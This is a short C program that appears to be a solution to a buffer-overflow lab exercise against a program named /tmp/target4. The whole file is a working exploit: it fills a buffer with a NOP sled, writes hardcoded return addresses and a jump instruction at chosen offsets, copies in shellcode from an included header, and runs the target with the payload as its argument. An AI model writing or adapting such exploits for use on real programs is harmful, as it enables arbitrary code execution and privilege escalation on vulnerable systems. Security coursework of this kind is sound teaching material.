#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char exploit[1024];
  memset(exploit, 0x90, sizeof(exploit));

  int *p_s_l = (int *)(exploit + 504);
  *p_s_l = 0x804a0eb;

  int *p_s_r = (int *)(exploit + 508);
  *p_s_r = 0xbffffa5c;

  int *ugh = (int *)(exploit + 131);
  *ugh = 0x909006eb;

  int *blah = (int *)(exploit + 135);
  *blah = 0xbffffa5d;

  memcpy(exploit+139, shellcode, sizeof(shellcode) - 1);

  char *args[] = { TARGET, exploit, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
